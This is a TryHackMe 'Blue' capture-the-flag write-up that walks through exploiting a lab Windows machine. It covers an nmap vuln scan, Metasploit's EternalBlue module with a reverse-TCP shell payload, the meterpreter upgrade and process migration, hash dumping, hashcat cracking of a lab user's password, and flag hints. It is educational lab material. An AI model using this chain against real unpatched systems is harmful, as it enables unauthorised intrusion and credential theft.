---
layout: default
title: Blue
parent: TryHackMe
grand_parent: CTF (writeup)
permalink: /ctf/tryhackme/blue.html
---
Windows
{: .label }

EternalBlue
{: .label .label-blue }
Room: [tryhackme.org/room/blue](https://tryhackme.com/room/blue)

## Reconnaissance
First we need to do Reconnaissance.
Just another port scanning :D


``` bash
$ nmap -sV -vv --script vuln TARGET-IP
```

### Task 1 - Question
Port under 1000?
![nmap-port](/images/blue01.jpg)

What is this machine vulnerable to?
![nmap-vuln](/images/blue02.jpg)

___
## Gain Access
1. Start metasploit 
1. Search an exploit for **(ms170-010)**
1. Use the exploit
``` bash
msf> exploit/windows/smb/ms17_010_eternalblue
```
1. Set **RHOSTS** value
1. Set payload
``` bash
set payload windows/x64/shell/reverse_tcp
```
1. Run the exploit & pray :D 
1. If succeed. Background this shell **(CTRL+Z)** 
![blue-session](/images/blue03.jpg)

___
## Escalate
Escalate privileges & upgrade shells in metasploit.
1. Search **shell_to_meterpreter** - Result: **post/multi/manage/shell_to_meterpreter**
1. Use it :D 
1. set session & run (be patient & wait)
<br>(NOTE: If you dont know how, go back & learn to use metasploit :D)
![blue-meterpreter](/images/blue04.jpg)
1. List all of the processes running via thex 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
![blue-ps](/images/blue05.jpg)
1. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step.
![blue-migrate](/images/blue06.jpg)

____
## Cracking
Dump the non-default user's password and crack it!

1. Within our elevated meterpreter shell, dump all of the passwords. 
![blue-dump](/images/blue07.jpg)
1. Copy the password hash & crack it.
``` bash 
$ hashcat -a 0 -m 1000 crack.txt /usr/share/wordlists/rockyou.txt
```
Result: **Jon:alqfna22**

___
## Find flags!
### Flag 1
Hint: Can you "C" it? So flag1 is located on C:\

### Flag 2
Hint: I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.
"On Windows" maybe is on \Windows\ ? :V

### Flag 3
This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

Maybe is located on \User\Documents\ ? 



